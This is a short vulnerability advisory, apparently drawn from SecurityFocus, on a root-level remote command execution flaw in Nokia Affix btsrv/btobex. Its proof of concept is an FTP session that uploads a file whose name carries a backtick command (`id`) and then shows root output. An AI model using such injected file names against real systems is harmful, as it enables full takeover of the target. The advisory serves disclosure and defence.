@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/14232/info
+
+Nokia Affix btsrv/btobex are reported prone to a remote command execution vulnerability. The issue exists due to a lack of input sanitization that is performed before using attacker-controlled data in a 'system()' call.
+
+Because the affected services run with superuser privileges, this issue may be exploited to fully compromise a target computer that is running the affected software.
+
+ftp> put /etc/hosts `id`
+Transfer started...
+Transfer complete.
+257 bytes sent in 0.9 secs (2855.56 B/s)
+ftp> ls
+-rwdx 257 uid=0(root) gid=0(root) groups=0(root)
+Command complete. 
